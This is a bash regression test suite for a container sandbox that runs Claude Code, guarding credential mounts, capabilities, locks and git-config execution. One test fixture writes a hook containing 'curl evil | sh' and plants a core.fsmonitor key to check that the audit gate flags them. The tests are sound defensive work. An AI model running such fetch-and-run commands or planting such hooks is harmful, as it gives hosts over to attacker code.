#!/usr/bin/env bash
# Sourced by tests/check.sh — one guard per settled bug.
#
# Every check here corresponds to a failure that actually shipped. Do not relax one to make a
# refactor pass; the bug is what the assertion is for.

# shellcheck source=SCRIPTDIR/_guard.sh
. "${BASH_SOURCE%/*}/_guard.sh" # sourced by tests/check.sh, never run directly

section "Regression guards"

# settings.json must never be bind-mounted from canonical: it is the file a HOST `claude` loads,
# and hooks[].command / apiKeyHelper in it are host code execution. The box gets a vetted COPY.
# Match on the BIND, not the filename — the old code took the name from a loop variable, so
# grepping "settings.json:" silently never fired. Two $CLAUDE_HOME binds are legitimate (this
# project's transcripts, and `_bind_shared_asset`, the one helper both tiers go through);
# anything else is the regression.
# Both spellings of "mount this": the direct one and bind_via_link, which takes the same source
# as its first argument.
# shellcheck disable=SC2016  # literal grep patterns: they must match the source text verbatim
stray_home_binds="$(grep -E '^[[:space:]]*(ARGS\+=\(-v|bind_via_link) "\$CLAUDE_HOME/' \
    "$KIB_ROOT/host/lifecycle.sh" \
    | grep -vE '\$CLAUDE_HOME/projects/\$SLUG[":]' | grep -vE '\$CLAUDE_HOME/\$1[":]' || true)"
if [ -n "$stray_home_binds" ]; then
    fail "canonical ~/.claude content is bind-mounted into the container: $(printf '%s' "$stray_home_binds" | tr -s ' ')" \
        "a sandboxed session could then write the settings.json the host claude loads"
elif ! grep -q 'merge_out_shared_settings' "$KIB_ROOT/host/config.sh"; then
    fail "merge_out_shared_settings is never called" \
        "in-session settings edits would silently never reach ~/.claude"
else
    pass "settings.json is staged as a vetted copy, never bound from canonical"
fi

# The fold-back must refuse an unvettable file rather than fold it unchecked.
if sed -n '/^merge_out_shared_settings()/,/^}$/p' "$KIB_ROOT/host/config.sh" | grep -q 'have_python'; then
    pass "settings fold-back refuses to merge when it cannot vet the file"
else
    fail "merge_out_shared_settings folds settings.json back without a python vet" \
        "no vet, no fold-back — otherwise a host without python3 loses the protection"
fi

# THE logout regression. Anthropic refresh tokens are single-use and rotate, so a broker handed
# the live credentials file invalidates the token family for the host CLI and every other
# project's sidecar. Its secret is the static claude-token, mounted READ-ONLY.
# No `sed | grep -q`: under pipefail, grep -q exits on first match and SIGPIPEs the sed, so the
# pipeline reports 141 and a MATCH reads as a failure.
if grep -qE '^[[:space:]]*-v ".*\.credentials\.json:' "$KIB_ROOT/host/broker.sh"; then
    fail "host/broker.sh bind-mounts .credentials.json into the broker" \
        "that is the logout bug — broker the static token file instead (kib broker login)"
else
    pass "the broker never mounts the live .credentials.json (static token only)"
fi

# Every broker token mount — /run/broker/token/<id> — must be READ-ONLY, so there is no write
# path to a credential by construction.
kib_all="$(grep -oE '\-v "[^"]*:/run/broker/token/[^"]*"' "$KIB_ROOT/host/broker.sh" || true)"
kib_n=$(printf '%s\n' "$kib_all" | grep -c . || true)
if [ "$kib_n" -gt 0 ] && ! printf '%s\n' "$kib_all" | grep -qv ':ro"$'; then
    pass "broker credential mounts are all read-only ($kib_n mount(s))"
else
    fail "a broker credential mount is not read-only" \
        "every -v …:/run/broker/token/… must end :ro (found $kib_n, at least one without)"
fi

# Screen clearing (removed): kib must not `tput reset` — it wiped a short command's output
# and clobbered scrollback when interactive Claude quit. Claude Code's TUI manages its own
# screen, so kib leaves the terminal alone.
if sed 's/#.*$//' "$KIB_ROOT/bin/kib" "$KIB_ROOT/host/lifecycle.sh" | grep -qE '\btput[[:space:]]+reset\b'; then
    fail "kib calls 'tput reset'" "removed on purpose — it wiped command output + scrollback"
else
    pass "kib leaves the terminal to Claude's TUI (no 'tput reset')"
fi

# A backgrounded rebuild must not decide "nobody is watching" from the tty alone. setsid drops
# the controlling terminal but leaves fd 1 on the user's terminal, so `[ -t 1 ]` stayed true
# and BuildKit drew its progress UI over the running Claude session while the log got nothing.
if grep -qE '^if \[ "\$\{1:-\}" != --background \] && \[ -t 1 \]' "$KIB_ROOT/tools/build-image.sh" \
    && grep -q 'build-image.sh" --background >/dev/null 2>&1' "$KIB_ROOT/host/image.sh"; then
    pass "backgrounded rebuild stays off the terminal (--background + redirect, not just [ -t 1 ])"
else
    fail "background rebuild can stream over the session" \
        "build-image.sh must honour --background, and host/image.sh must pass it AND redirect"
fi

# tools/build-image.sh is the ONE builder, because it is the one path that takes BUILD_LOCK and
# the one that resolves CLAUDE_VERSION. The first-launch build was a second, unlocked
# `docker build`, so `kib build` racing a first `cc` ran two builds on the same tag — and a bare
# build pins CLAUDE_VERSION to the literal `latest`, which poisons the layer cache for good.
if sed 's/#.*$//' "$KIB_ROOT/host/image.sh" "$KIB_ROOT/host/lifecycle.sh" "$KIB_ROOT/bin/kib" \
    | grep -qE '\bdocker[[:space:]]+build\b'; then
    fail "a bare 'docker build' is back outside tools/build-image.sh" \
        "it skips BUILD_LOCK (two concurrent builds on one tag) and pins CLAUDE_VERSION=latest"
else
    pass "every image build goes through tools/build-image.sh (locked, version-resolved)"
fi

# Every rebuild leaves the old :latest dangling; with no prune, 15 of them (~16 GB) piled up.
if grep -q '^LABEL keep-it-in-your-box=1$' "$KIB_ROOT/Dockerfile" \
    && grep -q 'docker image prune -f --filter label=keep-it-in-your-box ' \
        "$KIB_ROOT/tools/build-image.sh"; then
    pass "a successful build prunes kib's own dangling images (label-scoped)"
else
    fail "build-image.sh no longer prunes the image it replaces" \
        "every rebuild then leaks the old :latest — Dockerfile LABEL and prune must match"
fi

# The view (host/view, Go) — what its tests cannot see. Its behaviour is pinned by `go test`
# against tests/fixtures/redaction (run by `kib build`, and on a real FUSE mount in CI).
_gf="$(cat "$KIB_ROOT"/host/view/[!_]*[!t].go)" # the code, not its *_test.go
# Concurrent requests share one fd offset: lseek+read truncated reads at a 16 KiB boundary.
# (billy's File.Seek, which NFS needs, only moves its own offset.)
if grep -v '^func ' <<<"$_gf" | grep -q 'Seek(' \
    || ! grep -q 'syscall.Pwrite(h.fd' <<<"$_gf"; then
    fail "the FUSE view seeks, or lost pwrite" "a shared fd offset truncates concurrent I/O"
else
    pass "FUSE view I/O is offset-atomic (pread/pwrite, no shared fd offset)"
fi
# git's own executed paths are never a mirror, checked before any suffix walk.
if [ "$(awk '/^func \(v \*view\) mirrorAnchor/ {f=1} f && /gitSensitive/ {print "ok"; exit} f && /for i/ {exit}' <<<"$_gf")" = ok ]; then
    pass "the mirror rule excludes git's own paths before any suffix walk"
else
    fail "mirrorAnchor walks suffixes before checking gitSensitive" \
        "a root 'config'/'hooks' twin would make .git/config mirrorable"
fi
unset _ma

# Every host process backgrounded from the launch path must close fds 200/201. One miss and the
# child holds the project's SHARED lock, so the last terminal out cannot take it exclusively —
# teardown never runs and the containers are stranded. Shipped that way in the background image
# rebuild, which outlives the session by minutes. Background JOBS are discovered, not listed, so
# a new one is covered the day it is added — but only fds 200/201 are asserted. 202 (teardown's
# exclusive retry) and 203 (the canonical .claude.json lock) are held only while tearing down,
# where nothing is backgrounded today; a background job added THERE would need them too.
# portable.sh is excluded — it DEFINES detach_pgrp, and closes every fd >=2 itself on darwin.
#
# The FILE list is derived from host/_load.sh, not typed here: it was typed once and went stale
# the moment _load.sh grew gitguard and mcp, leaving three launch-path units — core, gitguard,
# mcp — unchecked while this guard read as covering everything. sleep-guard/sleep-monitor are
# not in _load.sh and are correctly out of scope: the guard is itself launched with the closes
# (host/lifecycle.sh), and the monitor is a diagnostic off the launch path.
fd_bad=""
fd_units="$(sed -n 's/^for _kib_unit in \(.*\); do$/\1/p' "$KIB_ROOT/host/_load.sh")"
if [ -z "$fd_units" ]; then
    fail "cannot read the unit list out of host/_load.sh" \
        "the fd-200/201 guard derives its file list from it and would silently check nothing"
fi
for fd_f in bin/kib $(for fd_u in $fd_units; do
    [ "$fd_u" = portable ] || printf 'host/%s.sh\n' "$fd_u"
done); do
    [ -f "$KIB_ROOT/$fd_f" ] || continue
    while IFS= read -r fd_line; do
        # A file with no background job yields one empty line from the heredoc below.
        if [ -z "$fd_line" ]; then continue; fi
        case "$fd_line" in
            *'200>&-'*'201>&-'*'205>&-'*) ;;
            *) fd_bad="$fd_bad $fd_f:$(printf '%s' "$fd_line" | sed 's/^ *//' | cut -c1-40)" ;;
        esac
    done <<EOF
$(grep -hE '(detach_pgrp |[^&>]& *$)' "$KIB_ROOT/$fd_f" | grep -v '&&')
EOF
done
if [ -z "$fd_bad" ]; then
    pass "every backgrounded host process closes the lock fds (200/201/205)"
else
    fail "a backgrounded host process inherits the project lock:$fd_bad" \
        "it holds a shared lock, so the last session out cannot tear down the containers or the VM"
fi
unset fd_bad fd_f fd_line

# The mirror of the above: undoing detach_pgrp goes through kill_pgrp, never a hand-rolled
# `kill -TERM -$pid` from a pidfile. A detached child that already exited frees its pid, Linux
# recycles numbers near-sequentially, and one launch's stale pidfile named the NEXT launch's own
# process group — SIGTERMing bin/kib right after the banner, silently, with no container. Four
# copies of the pattern existed; two had no guard at all.
# shellcheck disable=SC2016  # a literal grep pattern: it must match the source text verbatim
kp_bad="$(grep -rln 'kill -TERM "-\$' "$KIB_ROOT"/bin/kib "$KIB_ROOT"/host/*.sh \
    | grep -v '/portable\.sh$' || true)"
if [ -z "$kp_bad" ]; then
    pass "process groups are killed only through kill_pgrp (no recycled-pid signal)"
else
    fail "a hand-rolled group kill from a pidfile: $kp_bad" \
        "a recycled pid can name kib's own group — use kill_pgrp, which refuses that"
fi
unset kp_bad

# Mashing ^C to quit Claude must not strand containers. A tty ^C signals the whole foreground
# process group, so every press after `docker exec` restored cooked mode lands on kib itself:
# bash enters the EXIT trap on the first and the NEXT one killed it mid-`docker stop`, leaving the
# main container, the FUSE sidecar and the broker running with the session gone. Teardown must
# therefore disarm the three before it touches docker, and by IGNORING them — SIG_IGN survives
# fork+exec, so the `docker` children are covered too.
cu_first="$(sed -n '/^kib_cleanup()/,/^}$/p' "$KIB_ROOT/host/lifecycle.sh" \
    | sed -n '2,$p' | grep -vE '^[[:space:]]*(#|$)' | head -1)"
case "$cu_first" in
    *"trap ''"*INT*HUP*TERM*)
        pass "teardown ignores INT/HUP/TERM first, so ^C-mashing cannot orphan containers"
        ;;
    *)
        fail "kib_cleanup does not open with \`trap '' INT HUP TERM\`: ${cu_first:-<empty>}" \
            "a second ^C then kills teardown mid-docker-stop and strands every container"
        ;;
esac
unset cu_first

# The paired half: an INT handler that `exit`s is NOT the fix and actively breaks the one above —
# while it is armed, a ^C arriving inside the EXIT trap fires it and aborts teardown. A ^C already
# reaches that trap on its own (it kills the foreground child and bash propagates).
# shellcheck disable=SC2016  # a literal grep pattern: it must match the source text verbatim
if grep -qE "^[[:space:]]*trap '[^']*exit[^']*' .*INT" "$KIB_ROOT/host/lifecycle.sh"; then
    fail "an exiting INT handler is installed in host/lifecycle.sh" \
        "it fires inside kib_cleanup and aborts teardown — ignoring INT there is the fix"
else
    pass "no exiting INT handler competes with the teardown's signal ignore"
fi

# A script started BY detach_pgrp is a separate process, and bin/kib never exports KIB_ROOT — so
# requiring it from the environment makes the script exit instantly on every launch. It shipped
# that way in shared-watch.sh: the notifier never ran once, and the dead pid it recorded is what
# armed the group-kill above. Sourced files (host/_load.sh) are exempt: they see the caller's.
kr_bad=""
for kr_f in "$KIB_ROOT"/host/*.sh; do
    case "$kr_f" in */_load.sh) continue ;; esac
    grep -q '^#!' "$kr_f" 2>/dev/null || continue # sourced unit, not an executed script
    grep -q 'KIB_ROOT:?' "$kr_f" && kr_bad="$kr_bad $(basename "$kr_f")"
done
if [ -z "$kr_bad" ]; then
    pass "no detached host script demands KIB_ROOT from the environment"
else
    fail "script(s) require an unexported KIB_ROOT:$kr_bad" \
        "detach_pgrp gives them a fresh environment — derive it from \$0 instead"
fi
unset kr_bad kr_f

# The synthetic placeholder credential is held read-only by a :ro MOUNT, never by chmod.
# Docker Desktop's `fakeowner` bind layer records the mode but ignores it in access(2), so a
# 0400 copy is writable inside the box on macOS — the control silently did nothing there.
if awk '/^_stage_placeholder_credential\(\)/,/^}/' "$KIB_ROOT/host/broker.sh" \
    | grep -q 'bind_via_link .* :ro'; then
    pass "the placeholder credential is read-only by mount, not by mode bit (fakeowner)"
else
    fail "the placeholder credential lost its :ro mount" \
        "chmod alone is a no-op on Docker Desktop's fakeowner binds"
fi

# ── The view's topology ──────────────────────────────────────────
# The view runs on the host and reaches the box as a bind of the VM's NFS mount, so the box is
# capless at CREATION. Losing any of these silently hands it mount capability back.
_red="$(sed 's/#.*$//' "$KIB_ROOT/host/redaction.sh")"
_life="$(sed 's/#.*$//' "$KIB_ROOT/host/lifecycle.sh")"
_leaked=""
for _flag in 'cap-add=SYS_ADMIN' 'cap-add=SETPCAP' '/dev/fuse' 'apparmor=unconfined'; do
    case "$_life$_red" in *"$_flag"*) _leaked="$_leaked $_flag" ;; esac
done
# The one thing redaction.sh hands the box is the bind, nothing else. Pinned exactly: an added
# flag lands on this line.
# shellcheck disable=SC2016  # matching redaction.sh's source text; the $vars stay literal
printf '%s\n' "$_red" | grep -q '^ *REDACTION_ARGS=(-v "\$VIEW_MNT:\$PWD")$' \
    || _leaked="$_leaked REDACTION_ARGS"
if [ -z "$_leaked" ]; then
    pass "the agent's container is capless at creation (no SYS_ADMIN/SETPCAP//dev/fuse/apparmor)"
else
    fail "the agent's container regained:$_leaked" \
        "the view is served from the host; nothing the agent runs may be able to mount"
fi

# `setpriv` was how the in-container mount clawed the caps back off each session. Its return
# means the container is being created with caps to drop again.
if printf '%s\n' "$_life" | grep -q 'setpriv'; then
    fail "host/lifecycle.sh runs setpriv on the session exec again" \
        "capless-at-runtime is the shape the host view exists to replace"
else
    pass "sessions need no runtime cap drop (nothing was granted to drop)"
fi

# Unmount, then stop the view: a soft mount of a dead server only times out. And never die: it
# runs from the EXIT trap ahead of merge_out_session, so aborting loses the session's fold-back.
_td="$(printf '%s\n' "$_red" | awk '/^teardown_redaction\(\)/,/^}/')"
_un="$(printf '%s\n' "$_td" | grep -n 'vm_view_unmount' | head -1 | cut -d: -f1)"
# shellcheck disable=SC2016  # matching redaction.sh's source text
_kill="$(printf '%s\n' "$_td" | grep -n 'kill_pgrp "\$VIEW_STATE.pid"' | head -1 | cut -d: -f1)"
if [ -n "$_un" ] && [ -n "$_kill" ] && [ "$_un" -lt "$_kill" ] \
    && ! printf '%s\n' "$_td" | grep -qw die; then
    pass "teardown unmounts the view in the VM before stopping it, and never dies"
else
    fail "teardown_redaction stops the view before unmounting it, or can die" \
        "the exit path must reach merge_out_session"
fi
unset _red _life _leaked _flag _td _un _kill

# Both rule files are argv and both required: an optional --guard-file fails OPEN (zero
# [protect] rules, the mount reported active). "No rules" is an empty file, never a missing flag.
# shellcheck disable=SC2016  # matching redaction.sh's source text
if grep -q -- '--guard-file "$KIB_GUARD_FILE_HOST"' "$KIB_ROOT/host/redaction.sh" \
    && grep -q -- '--patterns-file "$PATTERNS_STATE"' "$KIB_ROOT/host/redaction.sh" \
    && grep -q '\*patterns == "" || \*guardFile == ""' <<<"$_gf"; then
    pass "the view is handed both rule files, and refuses to start without the guard one"
else
    fail "the redaction view can start without guard rules" \
        "a dropped --guard-file must abort the view, not launch an unprotected box"
fi
# The server's syscalls run as ITS uid: without default_permissions a `chmod 000` file reads.
if grep -q '"default_permissions"' <<<"$_gf"; then
    pass "the FUSE mount asks the kernel to enforce owner/mode (default_permissions)"
else
    fail "the FUSE view no longer mounts with default_permissions" \
        "a passthrough enforces no POSIX permission at all without it"
fi
# Page cache kept only while mtime+size hold (libfuse's auto_cache): never-revalidate would
# serve the user's own stale bytes after a host edit, and none at all cost a Nuxt build 20x.
if ! grep -A1 'if same {' <<<"$_gf" | grep -q 'return fuse.FOPEN_KEEP_CACHE' \
    || [ "$(grep -c 'FOPEN_KEEP_CACHE' <<<"$_gf")" != 1 ]; then
    fail "the FUSE view caches pages without revalidating, or not at all" \
        "keep the cache only while mtime and size are what the last open saw"
else
    pass "the FUSE mount page-caches with open-time revalidation"
fi
# SIGHUP is the live rule reload; an unhandled one kills pid 1 and the view with it.
if grep -q 'signal.Notify(sig, syscall.SIGHUP' <<<"$_gf"; then
    pass "the view reloads its rules on SIGHUP"
else
    fail "the FUSE view no longer handles SIGHUP" "the host's live reload would kill the view"
fi

# The watcher runs detached, with no terminal to ask at, so its ONE reload call must sit behind
# the tightens gate. Unconditional, a session that wrote `!.env` into .kibignore would have it
# applied to the live view within seconds — by the host, on the box's say-so, with nobody told.
# Code only: the header names _reload_rules in prose, which must not count as a call.
_rw="$(sed 's/#.*$//' "$KIB_ROOT/host/rules-watch.sh")"
if [ "$(printf '%s\n' "$_rw" | grep -c '_reload_rules')" = 1 ] \
    && printf '%s\n' "$_rw" | grep -A1 '_rules tightens' | grep -q '_reload_rules'; then
    pass "host/rules-watch.sh reloads only behind the tightens gate"
else
    fail "host/rules-watch.sh can reload without checking tightens first" \
        "a detached watcher has nobody to ask, so a loosening edit must wait for an attach"
fi
unset _rw

# flush runs on EVERY close(2): an fsync there is a forced writeback per file, read-only too.
if awk '/^func \(n \*node\) Flush/ {f=1; next} f && /^func / {exit} f' <<<"$_gf" \
    | grep -q 'Fsync'; then
    fail "the FUSE view fsyncs in Flush" "that is a forced writeback on every close"
else
    pass "Flush does not fsync (the kernel calls it on every close)"
fi
# A view in FUSE mode must exit when its mount goes, never fall through to serving NFS.
if awk '/serveFUSE\(v, \*mnt, \*allowOther, build\)/ {getline; print; exit}' <<<"$_gf" | grep -q 'return'; then
    pass "the FUSE view exits with its mount (no NFS server after it)"
else
    fail "serve() falls through from FUSE to NFS" "an unmounted no-VM view would keep serving the project"
fi
unset _gf

# ── The host view's wiring (each one broke, or nearly broke, its first real run) ──
# .dockerignore keeps host/ out of the build context; the view's Go source lives in it.
if grep -qx 'host' "$KIB_ROOT/.dockerignore" && ! grep -qx '!host/view' "$KIB_ROOT/.dockerignore"; then
    fail ".dockerignore hides host/view from the build" "kib build fails: COPY host/view/ not found"
else
    pass "the build context carries the view's source (host/view)"
fi
# sync: without it a refused write is buffered and reported done (measured: an append to
# .git/config read WRITTEN while the host's stayed untouched). soft: a dead view errors, never hangs.
_opts="$(sed -n 's/^VIEW_NFS_OPTS="\(.*\)"$/\1/p' "$KIB_ROOT/host/vm.sh")"
case ",$_opts," in
    *,sync,*soft,* | *,soft,*sync,*) pass "the VM mounts the view sync and soft" ;;
    *) fail "the view's NFS mount lost sync or soft" "options: $_opts" ;;
esac
unset _opts
# limactl shell reads stdin: without </dev/null it swallows the caller's input (a pasted script,
# a pipe). And nothing may pipe into a VM command for that reason: pass arguments.
if ! grep -A2 '^vm_root() {' "$KIB_ROOT/host/portable.sh" | grep -q '</dev/null'; then
    fail "vm_root lost its </dev/null" "limactl shell reads stdin and eats the caller's"
elif grep -nE '\| *(vm_root|_in_engine)\b' "$KIB_ROOT"/host/*.sh | grep -v '^\s*#' | grep -q .; then
    fail "something pipes into a VM command" "vm_root reads /dev/null: pass arguments instead"
else
    pass "VM commands never read stdin"
fi
# The host runs git on a repo the box writes: ls-files would run a core.fsmonitor it planted.
if grep -q 'ls-files' "$KIB_ROOT/host/gitguard.sh" \
    && ! grep -q -- '-c core.fsmonitor=false ls-files' "$KIB_ROOT/host/gitguard.sh"; then
    fail "the host's git ls-files can run the repo's core.fsmonitor" "host code execution from the box"
else
    pass "the host's git ls-files runs with core.fsmonitor off"
fi

# kib installs no hook into a user's repo: the checks run at launch, teardown and `kib audit`.
# Why a hook is not an option is in kib/host/gitaudit.py's docstring.
if [ -e "$KIB_ROOT/ccignore-precommit.py" ]; then
    fail "the auto-installed pre-commit hook is back" "its checks belong in host/gitguard.sh"
else
    pass "no hook is installed into user repos"
fi

# PYTHONPATH must never be set image-wide: it would leak into every process the agent runs.
if grep -qE '^\s*ENV\s+PYTHONPATH' "$KIB_ROOT/Dockerfile"; then
    fail "Dockerfile sets PYTHONPATH image-wide" "it would leak into every agent subprocess"
else
    pass "PYTHONPATH is per-exec only (guest shims), never an image ENV"
fi

# The audit gate's two severities through the BASH entry point — the Python side is unit-tested,
# but the hazard is here: called as a plain command under `set -e`, a non-zero return for a
# warn-class finding turns "you are tracking a hidden path" into "the sandbox will not start".
# `launch` mode only — `report` raises a desktop notification, which a suite must not do.
t_audit_gate_severity() {
    local dir rc out
    dir="$(mktemp -d)"

    _gate_in() { # _gate_in <repo> — run kib_audit_gate launch there, under the real set -e
        (
            set -euo pipefail
            export KIB_ROOT
            # shellcheck source=SCRIPTDIR/../../host/_load.sh
            . "$KIB_ROOT/host/_load.sh"
            cd "$1" || exit 9
            kib_audit_gate launch
            echo GATE-RETURNED-OK
        ) 2>&1
    }

    # warn-class: a tracked path matching .kibignore is named, and the launch continues. The
    # match is the view's (`kib-view match`): a fake one answers for it.
    (
        GIT_TEMPLATE_DIR='' git init -q "$dir/warn"
        cd "$dir/warn" || exit 1
        printf 'secret.txt\n' >.kibignore
        printf 'v\n' >secret.txt
        git add -A
    ) >/dev/null 2>&1
    mkdir -p "$dir/data/keep-it-in-your-box"
    # shellcheck disable=SC2016 # the fake's own $1
    printf '#!/bin/sh\ncat >/dev/null\n[ "$1" = match ] && printf "secret.txt\\0"\n' >"$dir/data/keep-it-in-your-box/kib-view"
    chmod +x "$dir/data/keep-it-in-your-box/kib-view"
    rc=0
    out="$(XDG_DATA_HOME="$dir/data" _gate_in "$dir/warn")" || rc=$?
    if [ "$rc" = 0 ] && printf '%s' "$out" | grep -q 'GATE-RETURNED-OK' \
        && printf '%s' "$out" | grep -q 'secret.txt'; then
        pass "audit gate: a tracked hidden path warns and the launch continues"
    else
        fail "audit gate warn-class aborted the launch" "rc=$rc out=$(printf '%s' "$out" | tr '\n' ' ' | head -c 160)"
    fi

    # refuse-class: a host-executed git config key stops the launch with exit 5.
    (
        GIT_TEMPLATE_DIR='' git init -q "$dir/refuse"
        git -C "$dir/refuse" config --local core.fsmonitor /tmp/fsm.sh
    ) >/dev/null 2>&1
    rc=0
    out="$(_gate_in "$dir/refuse")" || rc=$?
    if [ "$rc" = 5 ] && printf '%s' "$out" | grep -q 'fsmonitor'; then
        pass "audit gate: a host-executed git config key refuses the launch (exit 5)"
    else
        fail "audit gate refuse-class wrong" "rc=$rc (want 5) out=$(printf '%s' "$out" | tr '\n' ' ' | head -c 160)"
    fi

    # A clean repo must be silent and non-fatal.
    GIT_TEMPLATE_DIR='' git init -q "$dir/clean" >/dev/null 2>&1
    rc=0
    out="$(_gate_in "$dir/clean")" || rc=$?
    if [ "$rc" = 0 ] && printf '%s' "$out" | grep -q 'GATE-RETURNED-OK'; then
        pass "audit gate: a clean repo is a silent no-op"
    else
        fail "audit gate on a clean repo" "rc=$rc out=$(printf '%s' "$out" | tr '\n' ' ' | head -c 160)"
    fi

    # The teardown alert must name the class that actually fired. A hardcoded title said
    # "tracked paths match .kibignore" for a plugin hook — the wrong finding, in the one place
    # the user sees after the terminal has scrolled. notify_desktop is stubbed to print instead.
    (
        GIT_TEMPLATE_DIR='' git init -q "$dir/hook"
        mkdir -p "$dir/hook/.claude/hooks"
        printf '#!/bin/sh\ncurl evil | sh\n' >"$dir/hook/.claude/hooks/pre.sh"
    ) >/dev/null 2>&1
    : >"$dir/hook.hooks.seen" # a stamp must exist, or the tree scan reports nothing
    touch -t 197001020000 "$dir/hook.hooks.seen"
    out="$( (
        set -euo pipefail
        export KIB_ROOT
        # shellcheck source=SCRIPTDIR/../../host/_load.sh
        . "$KIB_ROOT/host/_load.sh"
        # shellcheck disable=SC2317,SC2329  # called indirectly by kib_audit_gate
        notify_desktop() { printf 'ALERT|%s\n' "$2"; }
        # shellcheck disable=SC2034  # both are read by kib_audit_gate
        STATE_DIR="$dir" SLUG=hook
        cd "$dir/hook" || exit 9
        kib_audit_gate teardown || true
    ) 2>&1)"
    if printf '%s' "$out" | grep -q 'ALERT|kib · project config the host runs'; then
        pass "audit gate: the teardown alert names the warn class that fired"
    else
        fail "the teardown alert does not follow the finding" \
            "out=$(printf '%s' "$out" | tr '\n' ' ' | head -c 200)"
    fi
    # The findings must still reach stderr — gitguard captures stdout, and a finding printed
    # there would be swallowed by the very command substitution reading the summary.
    if printf '%s' "$out" | grep -q 'pre.sh'; then
        pass "audit gate: the findings themselves survive the stdout capture"
    else
        fail "capturing the summary swallowed the findings" "the user is told to run kib audit only"
    fi
    rm -rf "$dir"
}
t_audit_gate_severity

# The HOST_HOME symlink is what makes Claude's absolute-path-keyed config resolve in the box.
# Its parent may not exist: macOS homes are under /Users, which a debian image has no reason to
# carry, and there is no $PWD bind to create it. `ln` then failed ENOENT and the
# entrypoint's `set -e` killed PID 1 — the container died during startup with no message.
# shellcheck disable=SC2016  # literal grep pattern: it must match the source text verbatim
hh_block="$(sed -n '/^if .*! -e "\$HOST_HOME"/,/^fi$/p' \
    "$KIB_ROOT/guest/entrypoint/docker-entrypoint.sh")"
# shellcheck disable=SC2016
if printf '%s\n' "$hh_block" | grep -q 'mkdir -p "\$(dirname "\$HOST_HOME")"'; then
    pass "the entrypoint creates HOST_HOME's parent before symlinking it"
else
    fail "the entrypoint symlinks HOST_HOME without creating its parent" \
        "on macOS /Users is not in the image, so the container exits during startup"
fi

# …and the `.claude` alias one level down must cover BOTH $USER_HOME and $HOST_HOME, because
# which one Claude resolves depends on the block above. The sidecar's $PWD bind makes $HOST_HOME
# a REAL directory for a project under $HOME, so that block is skipped and $USER_HOME/.claude is
# invisible; a project outside $HOME gets the symlink and needs the $USER_HOME spelling instead.
# Pinning one spelling is how a host-installed plugin's absolute installPath dangled:
# enabledPlugins true, nothing in /mcp, no error anywhere.
# shellcheck disable=SC2016  # literal grep pattern: it must match the source text verbatim
if grep -q 'for _h in "\$USER_HOME" "\${HOST_HOME:-}"' \
    "$KIB_ROOT/guest/entrypoint/docker-entrypoint.sh" \
    && grep -q 'ln -s "\$CLAUDE_SESSION_DIR" "\$_h/\.claude"' \
        "$KIB_ROOT/guest/entrypoint/docker-entrypoint.sh"; then
    pass "the .claude alias is placed at both \$USER_HOME and \$HOST_HOME"
else
    fail "the entrypoint's .claude alias covers only one of \$USER_HOME / \$HOST_HOME" \
        "host-installed plugins dangle and their MCP servers silently never start"
fi

# …and the alias only makes a recorded path RESOLVE. Claude also validates it is inside the running
# config dir, which no symlink can satisfy, so the dir must be SPELLED the way the host spells it.
# The real assignment is evaluated against a fake HOME/PWD, step-aside included.
_cdir_src="$(sed -n '/^SESSION_CDIR=/,/esac$/p' "$KIB_ROOT/host/lifecycle.sh")"
_cdir() (
    HOME="$1" PWD="$2"
    eval "$_cdir_src"
    printf '%s\n' "$SESSION_CDIR"
)
is "the config dir is spelled with the host's own home (linux)" \
    "/home/kay/.claude" "$(_cdir /home/kay /home/kay/proj)"
is "the config dir is spelled with the host's own home (macos)" \
    "/Users/veronica/.claude" "$(_cdir /Users/veronica /Users/veronica/proj)"
is "a project inside canonical's store steps aside from a nested bind" \
    "/home/hostuser/.claude-session" "$(_cdir /home/kay /home/kay/.claude/plugins/foo)"
unset _cdir_src

# ── The shared asset trees are one symlink each, never a per-project farm ─────────────
# The farm existed only because plugins/ and hooks/ mounted :ro. Reintroducing it would bring
# back the whole subsystem it paid for — the depth table, the prune walk, the temp_git_* sweep,
# and the bounded chown that stopped the macOS cold start walking 100k+ cache entries (macos.md).
_ep="$KIB_ROOT/guest/entrypoint/docker-entrypoint.sh"
if grep -q 'farm_dir\|prune_farm' "$_ep"; then
    fail "the entrypoint farms shared assets per project again" \
        "every tree is writable now, so one symlink each is the whole job"
else
    pass "the entrypoint symlinks each shared asset tree, with no per-project farm"
fi
# Belt on the same cost: a recursive chown over the session dir walks the plugin cache through
# the symlink and puts ~30s back into every macOS cold start.
if grep -q 'chown -Rh .*CLAUDE_SESSION_DIR' "$_ep"; then
    fail "the session-dir chown is recursive again" \
        "it walks 100k+ plugin-cache entries — ~30s of macOS cold start (macos.md)"
else
    is "the session-dir chown stays bounded (-maxdepth)" "yes" \
        "$(sed -n 's/.*-maxdepth \([0-9][0-9]*\).*/yes/p' "$_ep" | head -1)"
fi
unset _ep

# The project container must NOT be created with --rm. It is the only place a startup failure
# explains itself: with --rm the engine reaped the container before wait_for_container_ready
# could read its logs, and the whole diagnostic was "No such container". teardown_container
# removes it explicitly instead.
sc_block="$(sed -n '/^start_container()/,/^}$/p' "$KIB_ROOT/host/lifecycle.sh")"
# shellcheck disable=SC2016  # a literal grep pattern: it must match the source text verbatim
rm_calls="$(grep -c 'docker rm -f "\$CNAME"' "$KIB_ROOT/host/lifecycle.sh" || true)"
if printf '%s\n' "$sc_block" | grep -q -- '--rm'; then
    fail "the project container is created with --rm" \
        "a container that dies during startup is reaped before its logs can be read"
elif [ "${rm_calls:-0}" -eq 0 ]; then
    fail "nothing removes the project container" "without --rm, teardown must rm it explicitly"
else
    pass "the project container survives a startup crash long enough to be logged"
fi

# The npx shim has to OUTRANK the node version cache, not merely exist. Every cached node ships
# its own npx and $KIB_PREPEND_PATH sits ahead of /usr/local/bin, where the shim used to live —
# so on any project with a Node pin it was shadowed, chrome-devtools-mcp launched Chrome with the
# inner sandbox on, and the browser SIGTRAP'd at startup once per tool call. Both PATH exports
# must therefore LEAD with the shim dir, and the shim's self-skip must name that same dir: the
# heredoc is quoted, so the path in it is a literal that nothing else keeps honest.
_ep="$KIB_ROOT/guest/entrypoint/docker-entrypoint.sh"
_shim_dir="$(sed -n 's/^KIB_SHIM_DIR=//p' "$_ep")"
_path_exports="$(grep -c '^[[:space:]]*export PATH=' "$_ep" || true)"
# shellcheck disable=SC2016  # literal grep pattern: it must match the source text verbatim
_shim_first="$(grep -c '^[[:space:]]*export PATH="\$KIB_SHIM_DIR:' "$_ep" || true)"
if [ -z "$_shim_dir" ]; then
    fail "the entrypoint no longer defines KIB_SHIM_DIR" \
        "the npx shim needs a directory of its own to be first on PATH"
